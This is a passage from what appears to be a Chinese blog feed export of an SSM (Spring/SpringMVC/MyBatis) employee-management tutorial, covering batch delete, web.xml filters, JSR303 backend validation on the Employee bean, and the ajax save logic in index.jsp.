class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteEmp</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        employeeMapper.deleteByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBatch</span><span class="params">(List&lt;Integer&gt; ids)</span> </span>&#123;</span><br><span class="line">        EmployeeExample example = <span class="keyword">new</span> EmployeeExample();</span><br><span class="line">        EmployeeExample.Criteria criteria = example.createCriteria();</span><br><span class="line">        <span class="comment">//delete from xxx where emp_id in(1,2,3)</span></span><br><span class="line">        criteria.andEmpIdIn(ids);</span><br><span class="line">        employeeMapper.deleteByExample(example);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后的web.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--1.启动Spring的容器  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.spring mvc的前端控制器，拦截所有请求--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  3.字符编码过滤器  一定要放在所有过滤器之前--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceRequestEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceResponseEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 4.使用Rest风格的URI  将页面普通的POST请求转为指定的delete或put请求 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HttpPutFormContentFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HttpPutFormContentFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HttpPutFormContentFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>最后的Employee<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.crud.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.hibernate.validator.constraints.Length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.Email;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> Integer empId;</span><br><span class="line"></span><br><span class="line">    @Pattern(regexp = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span></span><br><span class="line">            ,message = <span class="string">"用户名必须是2-5位中文或6-16位英文和数字的组合"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> empName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> gender;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    @Email</span></span><br><span class="line">    @Pattern(regexp = <span class="string">"^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$"</span></span><br><span class="line">            ,message = <span class="string">"邮箱格式不正确"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> email;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer dId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Department department;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Department <span class="title">getDepartment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(Integer empId, <span class="keyword">String</span> empName, <span class="keyword">String</span> gender, <span class="keyword">String</span> email, Integer dId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.empId = empId;</span><br><span class="line">        <span class="keyword">this</span>.empName = empName;</span><br><span class="line">        <span class="keyword">this</span>.gender = gender;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">        <span class="keyword">this</span>.dId = dId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDepartment</span><span class="params">(Department department)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.department = department;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getEmpId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> empId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmpId</span><span class="params">(Integer empId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.empId = empId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getEmpName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> empName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmpName</span><span class="params">(<span class="keyword">String</span> empName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.empName = empName == null ? null : empName.trim();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getGender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGender</span><span class="params">(<span class="keyword">String</span> gender)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.gender = gender == null ? null : gender.trim();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(<span class="keyword">String</span> email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email == null ? null : email.trim();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getdId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setdId</span><span class="params">(Integer dId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dId = dId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>以上就是与之前进行过修改的所有代码了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里画一个图来总结一下思路<br><img src="/img/JavaWeb/10-21学习日记/1.jpg" alt="avatar"></p>
<p>如果要部署到真实的服务器，使用maven构建war包就好了</p>
<p>注意点：</p>
<ol>
<li><p>新增，修改，引入数据校验（前后端）</p>
</li>
<li><p>删除，单个&amp;批量</p>
</li>
<li><p>mybatis generator-xxMapper</p>
</li>
<li><p>ajax,SpringMVC-@ResponseBody</p>
</li>
</ol>
<p><a href="/download/SSM.zip">源码下载</a></p>
<p>🌸🌸🌸完结撒花🌸🌸🌸</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SSM</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM-2020/10/19-员工管理系统-4</title>
    <url>/2020/10/19/SSM-2020-10-19-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h1><h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>之前完成了前端，合法性和重复性的检验，但是由于添加了一个自定义的ajax-va，所以还是会出现一个错误，就是ajax-va的存在导致了数据无法提交，但是将其改为success时，又可以成功提交并绕过重复性的检验，这是不期望看到的</p>
<p>所以还需要一个后端校验以及数据库约束等</p>
<p>已完成的校验：</p>
<ul>
<li><p>jquery前端校验</p>
</li>
<li><p>ajax用户名重复校验</p>
</li>
<li><p>合法性校验</p>
</li>
</ul>
<h3 id="后端校验-JSR303"><a href="#后端校验-JSR303" class="headerlink" title="后端校验(JSR303)"></a>后端校验(JSR303)</h3><p>这是为了防止用户提交非法数据，添加唯一约束，尤其是对于重要数据，必须要添加后端校验</p>
<p>需要导入Hibernate-Validator包，依旧是添加maven依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    JSR303校验  数据校验支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate.validator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-validator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.1.6.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在Employee.java中给empName和email添加上JSR303检验标准<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">Pattern</span>(<span class="keyword">regexp</span> = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span></span><br><span class="line">        ,message = <span class="string">"用户名必须是2-5位中文或6-16位英文和数字的组合"</span>)</span><br><span class="line">private String empName;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    @Email</span></span><br><span class="line">    <span class="meta">@Pattern(regexp = <span class="meta-string">"^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$"</span></span></span><br><span class="line"><span class="meta">            ,message = <span class="meta-string">"邮箱格式不正确"</span>)</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br></pre></td></tr></table></figure>
<p>Email可以直接写@Email或自定义</p>
<p>要想校验实现，只需要在Controller的对应方法中的封装对象添加上@Valid 就可以代表封装对象之后，封装的数据要进行校验，还可以定义一个BindingResult对象来封装校验的结果<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 员工保存</span></span><br><span class="line"><span class="comment"> * 1.支持JSR303校验</span></span><br><span class="line"><span class="comment"> * 2. 导入Hibernate-validator</span></span><br><span class="line"><span class="comment"> * @param employee</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@<span class="constructor">RequestMapping(<span class="params">value</span> = <span class="string">"/emp"</span>,<span class="params">method</span> = RequestMethod.POST)</span></span><br><span class="line">@ResponseBody</span><br><span class="line">public Msg save<span class="constructor">Emp(@Valid  Employee <span class="params">employee</span>, BindingResult <span class="params">result</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(result.has<span class="constructor">Errors()</span>)&#123;</span><br><span class="line">        <span class="comment">//校验失败应该返回失败，在模态框中显示校验失败的错误信息</span></span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;<span class="literal">()</span>;</span><br><span class="line">        List&lt;FieldError&gt; errors = result.get<span class="constructor">FieldErrors()</span>;</span><br><span class="line">        for(FieldError fieldError : errors)&#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"错误的字段名："</span>+fieldError.get<span class="constructor">Field()</span>);</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"错误信息："</span>+fieldError.get<span class="constructor">DefaultMessage()</span>);</span><br><span class="line">            map.put(fieldError.get<span class="constructor">Field()</span>,fieldError.get<span class="constructor">DefaultMessage()</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>fail<span class="literal">()</span>.add(<span class="string">"errorFields"</span>,map);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        employeeService.save<span class="constructor">Emp(<span class="params">employee</span>)</span>;</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>success<span class="literal">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>还需要修改一下index.jsp，让他点击完保存之后，有进一步的校验和提示信息<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//点击保存，保存员工</span></span><br><span class="line"><span class="constructor">$(<span class="string">"#emp_save_btn"</span>)</span>.click(<span class="keyword">function</span> <span class="literal">()</span> &#123;</span><br><span class="line">    <span class="comment">//1.模态框中填写的表单数据提交给服务器进行保存</span></span><br><span class="line">    <span class="comment">//2.先对要提交给服务器的数据进行校验</span></span><br><span class="line">    <span class="keyword">if</span>(!validata<span class="constructor">_add_form()</span>)&#123;</span><br><span class="line">        return <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//3.判断之前的ajax用户名校验是否成功</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="constructor">$(<span class="params">this</span>)</span>.attr(<span class="string">"ajax-va"</span>)==<span class="string">"error"</span>)&#123;</span><br><span class="line">        return <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//4.发送ajax请求保存员工</span></span><br><span class="line">    <span class="comment">// alert($("#empAddModal form").serialize());</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp"</span>,</span><br><span class="line">        <span class="keyword">type</span>:<span class="string">"POST"</span>,</span><br><span class="line">        data:<span class="constructor">$(<span class="string">"#empAddModal form"</span>)</span>.serialize<span class="literal">()</span>,</span><br><span class="line">        success:<span class="keyword">function</span> (result) &#123;</span><br><span class="line">            <span class="comment">//alert(result.msg);</span></span><br><span class="line">            <span class="keyword">if</span>(result.code<span class="operator"> == </span><span class="number">200</span>)&#123;</span><br><span class="line">                <span class="comment">//员工保存成功：</span></span><br><span class="line">                <span class="comment">//1. 关闭模态框</span></span><br><span class="line">                <span class="constructor">$(<span class="string">"#empAddModal"</span>)</span>.modal('hide');</span><br><span class="line">                <span class="comment">//2. 来到最后一页，显示刚才保存的数据</span></span><br><span class="line">                <span class="comment">//发送ajax请求显示最后一页数据即可</span></span><br><span class="line">                <span class="comment">//可以将总记录数当作页码</span></span><br><span class="line">                <span class="keyword">to</span><span class="constructor">_page(<span class="params">totalRecords</span>)</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//显示失败信息</span></span><br><span class="line">                <span class="comment">// console.log(result);</span></span><br><span class="line">                <span class="comment">//有哪个字段的错误信息，就显示哪个字段</span></span><br><span class="line">                <span class="keyword">if</span>(undefined != result.extend.errorFields.email)&#123;</span><br><span class="line">                    <span class="comment">//显示邮箱错误信息</span></span><br><span class="line">                    show<span class="constructor">_validate_msg(<span class="string">"#email_add_input"</span>,<span class="string">"error"</span>,<span class="params">result</span>.<span class="params">extend</span>.<span class="params">errorFields</span>.<span class="params">email</span>)</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(undefined != result.extend.errorFields.empName)&#123;</span><br><span class="line">                    <span class="comment">//显示员工错误信息</span></span><br><span class="line">                    show<span class="constructor">_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,<span class="params">result</span>.<span class="params">extend</span>.<span class="params">result</span>.<span class="params">extend</span>.<span class="params">errorFields</span>.<span class="params">empName</span>)</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>显示即使注释掉了前端的校验代码，依然会提示错误信息，并且后端的控制台中也会看到对应的信息<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">错误的字段名：<span class="section">email</span></span><br><span class="line">错误信息：邮箱格式不正确</span><br></pre></td></tr></table></figure><br>这里就完成了最终的校验</p>
<p>当然数据在创建的时候可以给用户名和邮箱等信息添加不可重复的依赖，那就又添加了一次保障</p>
<p>当前的index.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 员工添加的模态框 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>员工添加<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 